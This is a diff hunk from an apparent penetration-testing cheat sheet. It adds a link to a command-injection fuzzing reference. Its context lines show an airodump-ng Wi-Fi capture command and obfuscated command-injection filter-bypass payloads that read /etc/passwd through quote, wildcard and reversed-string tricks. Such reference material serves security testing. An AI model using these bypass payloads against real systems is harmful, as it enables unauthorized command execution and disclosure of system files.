@@ -399,6 +399,8 @@ airodump-ng --band abg wlan0 / --essid AP_NAME / --bssid MAC_ADDRESS_OF_ORIGINAL
 7. Multi bypass - reverse encoded + multi bypass filters - (EX:``` |cat /"e"t``c/p?sswd ```)
 7. Lethal injection - (EX:```"dws?ap/c``t"e"/ tac" | rev```)
 
+Fuzzing for bypass: https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/command-injection.md
+
 ```"dws?ap/c``t"e"/ tac" | rev```
 
 ### Command Injection filter bypass - blind
